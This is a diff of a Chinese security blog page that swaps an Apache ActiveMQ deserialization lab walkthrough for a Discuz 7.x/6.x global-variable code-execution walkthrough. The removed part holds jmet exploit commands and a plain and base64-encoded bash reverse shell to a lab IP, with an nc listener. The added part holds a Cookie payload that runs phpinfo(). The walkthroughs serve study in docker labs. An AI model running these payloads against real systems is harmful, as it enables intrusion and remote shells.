@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="反序列化漏洞,">
+  <meta name="keywords" content="Discuz 7.x/6.x 全局变量防御绕过导致代码执行,">
 
 
 
@@ -79,25 +79,23 @@
 
 
 
-<meta name="description" content="反序列化漏洞Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意">
-<meta name="keywords" content="反序列化漏洞">
+<meta name="description" content="Discuz 7.x/6.x 全局变量防御绕过导致代码执行由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。&amp;emsp;搭建漏洞环境（这里我已经搭建好了  直接启动）在相应的目录下启动docker-compose up -d&amp;ems">
+<meta name="keywords" content="Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行">
 <meta property="og:type" content="article">
-<meta property="og:title" content="反序列化漏洞">
-<meta property="og:url" content="http://yoursite.com/2019/07/25/ld/index.html">
+<meta property="og:title" content="Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行">
+<meta property="og:url" content="http://yoursite.com/2019/07/26/ld (8)/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="反序列化漏洞Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意">
+<meta property="og:description" content="Discuz 7.x/6.x 全局变量防御绕过导致代码执行由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。&amp;emsp;搭建漏洞环境（这里我已经搭建好了  直接启动）在相应的目录下启动docker-compose up -d&amp;ems">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/14/mkbKun.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/14/mkbcgH.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/14/mkb78g.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/14/mkqnPO.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/14/mkqgiT.png">
-<meta property="og:image" content="https://s2.ax1x.com/2019/08/14/mkqqJO.png">
-<meta property="og:updated_time" content="2019-08-14T15:11:32.112Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mADyDA.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mADh8S.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mAriUx.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/08/15/mAr8G8.png">
+<meta property="og:updated_time" content="2019-08-15T02:50:30.656Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="反序列化漏洞">
-<meta name="twitter:description" content="反序列化漏洞Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意">
-<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/14/mkbKun.png">
+<meta name="twitter:title" content="Discuz 7.x&#x2F;6.x 全局变量防御绕过导致代码执行">
+<meta name="twitter:description" content="Discuz 7.x/6.x 全局变量防御绕过导致代码执行由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。&amp;emsp;搭建漏洞环境（这里我已经搭建好了  直接启动）在相应的目录下启动docker-compose up -d&amp;ems">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/08/15/mADyDA.png">
 
 
 
@@ -127,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/07/25/ld/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/26/ld (8)/">
 
 
 
 
 
-  <title>反序列化漏洞 | Hexo</title>
+  <title>Discuz 7.x/6.x 全局变量防御绕过导致代码执行 | Hexo</title>
   
 
 
@@ -240,7 +238,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/25/ld/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/26/ld (8)/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="John Doe">
@@ -257,7 +255,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">反序列化漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1>
         
 
         <div class="post-meta">
@@ -269,8 +267,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-25T15:05:18+08:00">
-                2019-07-25
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-26T09:16:18+08:00">
+                2019-07-26
               </time>
             
 
@@ -308,7 +306,7 @@
 
       
         <hr>
-<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。<br>1.漏洞利用过程如下：<br>a.构造（可以使用ysoserial）可执行命令的序列化对象<br>b.作为一个消息，发送给目标61616端口<br>c.访问的Web管理页面，读取消息，触发漏洞<br>&emsp;<br>1.使用jmet进行漏洞利用:<br>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。<br>wget <a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar" target="_blank" rel="noopener">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a><br>mkdir external<br>&emsp;<br>2.执行命令<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “touch /tmp/zqd” -Yp ROME   192.168.199.120  61616<br><a href="https://imgchr.com/i/mkbKun" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbKun.png" alt="mkbKun.png"></a><br>&emsp;<br>3现在我们可以通过<a href="http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：" target="_blank" rel="noopener">http://192.168.199.120:8161/admin/browse.jsp?JMSDestination=event到这个队列中所有消息：</a><br><a href="https://imgchr.com/i/mkbcgH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkbcgH.png" alt="mkbcgH.png"></a><br>&emsp;<br>5.点击查看这条消息即可触发命令执行<br><a href="https://imgchr.com/i/mkb78g" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkb78g.png" alt="mkb78g.png"></a><br>&emsp;<br>6反弹shell:<br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -i &gt;&amp; /dev/tcp/192.168.199.207/8899 0&gt;&amp;1” -Yp ROME 192.168.199.120  61616<br>这里bash -i &gt;&amp; /dev/tcp/192.168.199.207/12340&gt;&amp;1”需要解码<br><a href="https://imgchr.com/i/mkqnPO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqnPO.png" alt="mkqnPO.png"></a><br>java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y “bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5OS4yMDcvODg5OSAwPiYx}|{base64,-d}|{bash,-i}” -Yp ROME 192.168.199.120 61616<br><a href="https://imgchr.com/i/mkqgiT" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqgiT.png" alt="mkqgiT.png"></a><br>&emsp;<br>7 远程主机监听8899端口：<br>nc  -lvvp  8899<br>nc -l -p 8899<br><a href="https://imgchr.com/i/mkqqJO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/14/mkqqJO.png" alt="mkqqJO.png"></a></p>
+<h1 id="Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><a href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行" class="headerlink" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行"></a>Discuz 7.x/6.x 全局变量防御绕过导致代码执行</h1><p>由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致$_REQUEST中不再包含$_COOKIE，我们通过在Cookie中传入$GLOBALS来覆盖全局变量，造成代码执行漏洞。<br>&emsp;<br>搭建漏洞环境（这里我已经搭建好了  直接启动）<br>在相应的目录下启动<br>docker-compose up -d<br><a href="https://imgchr.com/i/mADyDA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADyDA.png" alt="mADyDA.png"></a><br>&emsp;<br><a href="https://imgchr.com/i/mADh8S" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mADh8S.png" alt="mADh8S.png"></a><br>启动后，访问<a href="http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。" target="_blank" rel="noopener">http://your-ip:8080/install/来安装discuz，数据库地址填写db，数据库名为discuz，数据库账号密码均为root。</a><br><a href="https://imgchr.com/i/mAriUx" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAriUx.png" alt="mAriUx.png"></a><br>安装成功后，直接找一个已存在的帖子，向其发送数据包，并在Cookie中增加<br>GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();<br>&emsp;<br>phpinfo已成功执行：<br><a href="https://imgchr.com/i/mAr8G8" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/08/15/mAr8G8.png" alt="mAr8G8.png"></a></p>
 
       
     </div>
@@ -326,7 +324,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/反序列化漏洞/" rel="tag"># 反序列化漏洞</a>
+            <a href="/tags/Discuz-7-x-6-x-全局变量防御绕过导致代码执行/" rel="tag"># Discuz 7.x/6.x 全局变量防御绕过导致代码执行</a>
           
         </div>
       
@@ -339,8 +337,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/07/25/ld (2)/" rel="next" title="ActiveMQ任意文件写入">
-                <i class="fa fa-chevron-left"></i> ActiveMQ任意文件写入
+              <a href="/2019/07/25/ld/" rel="next" title="反序列化漏洞">
+                <i class="fa fa-chevron-left"></i> 反序列化漏洞
               </a>
             
           </div>
@@ -349,8 +347,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/07/26/ld (8)/" rel="prev" title="Discuz 7.x/6.x 全局变量防御绕过导致代码执行">
-                Discuz 7.x/6.x 全局变量防御绕过导致代码执行 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/07/26/ld (7)/" rel="prev" title="Couchdb 任意命令执行漏洞（CVE-2017-12636）">
+                Couchdb 任意命令执行漏洞（CVE-2017-12636） <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -474,7 +472,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">反序列化漏洞</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Discuz-7-x-6-x-全局变量防御绕过导致代码执行"><span class="nav-number">1.</span> <span class="nav-text">Discuz 7.x/6.x 全局变量防御绕过导致代码执行</span></a></li></ol></div>
             
 
           </div>
